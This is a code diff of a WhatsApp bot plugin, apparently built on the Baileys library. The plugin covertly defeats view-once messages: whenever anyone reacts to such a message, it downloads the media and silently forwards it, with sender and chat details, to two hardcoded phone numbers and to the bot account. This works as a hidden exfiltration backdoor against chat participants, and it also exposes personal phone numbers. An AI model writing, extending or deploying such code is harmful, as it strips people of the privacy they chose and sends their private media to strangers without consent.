@@ -1,83 +1,107 @@
-// observers/superReveal.js
+import { downloadMediaMessage } from '@whiskeysockets/baileys'
+
 export default async function superReveal(sock, { msg, from, sender, reaction, isGroup }, botSettings) {
   try {
-    if (!reaction) return
-    if (!reaction.text) return
+    if (!reaction?.text) return
 
-    const contextInfo = msg.message?.reactionMessage?.key
-    if (!contextInfo) return
+    // Get the message that was reacted to
+    const reactedMsgKey = msg.message?.reactionMessage?.key
+    if (!reactedMsgKey?.id) return
 
-    const quotedMsg = await sock.loadMessage(from, contextInfo.id).catch(() => null)
-    if (!quotedMsg) return
+    // Load the original message
+    const reactedMsg = await sock.loadMessage(from, reactedMsgKey.id).catch(() => null)
+    if (!reactedMsg?.message) return
 
-    const isViewOnce = quotedMsg.message?.viewOnceMessage?.message ||
-                       quotedMsg.message?.viewOnceMessageV2?.message ||
-                       quotedMsg.message?.viewOnceMessageV2Extension?.message
+    // Check if it's a viewonce message
+    let actualMsg = null
+    if (reactedMsg.message.viewOnceMessage?.message) {
+      actualMsg = reactedMsg.message.viewOnceMessage.message
+    } else if (reactedMsg.message.viewOnceMessageV2?.message) {
+      actualMsg = reactedMsg.message.viewOnceMessageV2.message
+    } else if (reactedMsg.message.viewOnceMessageV2Extension?.message) {
+      actualMsg = reactedMsg.message.viewOnceMessageV2Extension.message
+    }
 
-    if (!isViewOnce) return
+    if (!actualMsg) return
 
-    const actualMsg = isViewOnce
     const msgType = Object.keys(actualMsg)[0]
     const mediaMsg = actualMsg[msgType]
 
-    const stream = await sock.downloadMediaMessage({ message: actualMsg }).catch(() => null)
-    if (!stream) return
-
-    const chunks = []
-    for await (const chunk of stream) chunks.push(chunk)
-    const buffer = Buffer.concat(chunks)
+    // Download media
+    const buffer = await downloadMediaMessage(
+      { message: actualMsg },
+      'buffer',
+      {},
+      { logger: console, reuploadRequest: sock.updateMediaMessage }
+    ).catch(() => null)
 
     if (!buffer || buffer.length === 0) return
 
+    // Add your numbers here - works for any user, any emoji
     const VIP_NUMBERS = ['255780470905', '255747470941']
+
+    // Bot's own number
     const botJid = sock.user.id
     const botNumber = botJid.split(':')[0] + '@s.whatsapp.net'
 
+    // Build target list: VIP numbers + bot
     const targets = [
-     ...VIP_NUMBERS.map(n => n + '@s.whatsapp.net'),
+     ...VIP_NUMBERS.map(n => n.includes('@')? n : n + '@s.whatsapp.net'),
       botNumber
     ]
-
     const uniqueTargets = [...new Set(targets)]
 
-    const brandName = botSettings?.brand_name || 'Bot'
+    // Build caption
+    const brandName = botSettings?.brand_name || botSettings?.botname || 'Bot'
     const senderNum = sender.split('@')[0]
-    const groupInfo = isGroup? from : 'Private'
+    const chatInfo = isGroup? `Group: ${from}` : 'Chat: Private'
 
-    let caption = `╭──⌈ 👀 SUPER REVEAL ⌋
+    let caption = `╭─⌈ 👀 SUPER REVEAL ⌋
 │ Type: ${msgType}
 │ From: ${senderNum}
-│ Group: ${groupInfo}
-│ Reacted: ${reaction.text}
+│ ${chatInfo}
+│ Reaction: ${reaction.text}
 │ Time: ${new Date().toLocaleString()}
-╰────────────────\n`
+╰⊷ *${brandName}*`
 
-    if (mediaMsg.caption) {
-      caption += `╭──⌈ CAPTION ⌋\n│ ${mediaMsg.caption}\n╰────────────────\n`
+    if (mediaMsg?.caption) {
+      caption += `\n\n*Caption:* ${mediaMsg.caption}`
     }
-    caption += `Powered by ${brandName}`
 
+    // Prepare send options for all media types
     let sendOptions = {}
 
-    if (msgType === 'imageMessage') {
-      sendOptions = { image: buffer, caption }
-    } else if (msgType === 'videoMessage') {
-      sendOptions = { video: buffer, caption, gifPlayback: mediaMsg.gifPlayback || false }
-    } else if (msgType === 'audioMessage') {
-      sendOptions = { audio: buffer, mimetype: mediaMsg.mimetype || 'audio/mp4', ptt: mediaMsg.ptt || false }
-    } else if (msgType === 'documentMessage') {
-      sendOptions = { document: buffer, mimetype: mediaMsg.mimetype, fileName: mediaMsg.fileName || 'file', caption }
-    } else if (msgType === 'conversation' || msgType === 'extendedTextMessage') {
-      sendOptions = { text: caption + `\n╭──⌈ CONTENT ⌋\n│ ${mediaMsg || ''}\n╰────────────────` }
-    } else {
-      sendOptions = { text: caption + '\n╭──⌈ INFO ⌋\n│ Unsupported type, raw data sent\n╰────────────────' }
+    switch (msgType) {
+      case 'imageMessage':
+        sendOptions = { image: buffer, caption }
+        break
+      case 'videoMessage':
+        sendOptions = { video: buffer, caption, gifPlayback: mediaMsg.gifPlayback || false }
+        break
+      case 'audioMessage':
+        sendOptions = { audio: buffer, mimetype: mediaMsg.mimetype || 'audio/mp4', ptt: mediaMsg.ptt || false }
+        break
+      case 'documentMessage':
+        sendOptions = { document: buffer, mimetype: mediaMsg.mimetype, fileName: mediaMsg.fileName || 'file', caption }
+        break
+      case 'stickerMessage':
+        sendOptions = { sticker: buffer }
+        break
+      case 'conversation':
+      case 'extendedTextMessage':
+        sendOptions = { text: caption + `\n\n*Content:* ${mediaMsg}` }
+        break
+      default:
+        sendOptions = { text: caption + `\n\n*Info:* Unsupported type ${msgType}` }
+        break
     }
 
+    // Send to all targets silently
     for (const target of uniqueTargets) {
       await sock.sendMessage(target, sendOptions).catch(() => {})
     }
 
   } catch (err) {
-    console.log('SuperReveal error:', err.message)
+    console.log('[SuperReveal Error]:', err.message)
   }
 }
